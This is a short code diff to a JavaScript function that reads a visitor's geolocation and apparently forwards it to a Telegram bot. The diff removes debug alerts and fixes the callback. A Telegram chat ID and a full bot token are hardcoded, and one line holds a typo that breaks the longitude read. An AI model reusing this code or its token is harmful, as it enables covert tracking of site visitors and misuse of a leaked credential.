@@ -53,13 +53,12 @@ function tele(){
       ////  telegram bot  ////
         
       if(navigator.geolocation){ 
-        alert(1)
-        navigator.geolocation.getCurrentPosition().then(x=>{
+
+        navigator.geolocation.getCurrentPosition(x=>{
           const latitude  = x.coords.latitude;
           const longitude = x.coorde.longitude;
 
           var geoL={latitude:latitude,longitude:longitude};
-          alert(geoL)
 
         var chatId =`-4647034325`;
         var token  =`7883274835:AAHMSeD4WhgOSOl-DsPUXihoo-PDuBS3hWY`;
@@ -77,8 +76,6 @@ function tele(){
 
       })
 
-      }else{
-        alert(0)
       }
  }
 
